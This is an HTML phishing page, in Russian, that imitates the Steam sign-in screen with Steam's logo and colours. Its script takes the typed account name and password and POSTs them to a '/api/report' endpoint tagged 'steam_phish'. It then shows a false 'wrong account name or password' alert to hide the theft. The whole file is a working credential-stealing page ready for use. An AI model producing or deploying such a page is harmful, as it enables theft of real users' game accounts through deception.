<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Steam</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #1b2838; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #c7d5e0; }
        .container { text-align: center; max-width: 350px; width: 100%; padding: 20px; background: #171a21; border-radius: 4px; }
        .logo { width: 150px; margin-bottom: 20px; }
        h2 { font-size: 18px; margin-bottom: 15px; color: #fff; }
        input { width: 100%; padding: 10px; margin-bottom: 10px; border: none; border-radius: 3px; box-sizing: border-box; font-size: 15px; background: #316282; color: #fff; }
        button { width: 100%; padding: 12px; background: linear-gradient(to bottom, #75b022, #588a1b); color: #fff; border: none; border-radius: 3px; font-size: 16px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/8/83/Steam_icon_logo.svg" alt="Steam">
        <h2>Вход в Steam</h2>
        <input type="text" id="login" placeholder="Имя аккаунта" />
        <input type="password" id="password" placeholder="Пароль" />
        <button onclick="sendData()">Войти</button>
    </div>
    <script>
        function sendData() {
            const l = document.getElementById('login').value;
            const p = document.getElementById('password').value;
            if(!l || !p) return;
            fetch('/api/report', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ id: 'steam_phish', kind: 'steam_login', body: 'Логин: ' + l + '\nПароль: ' + p })
            }).then(() => {
                alert('Неверное имя аккаунта или пароль.');
            });
        }
    </script>
</body>
</html>
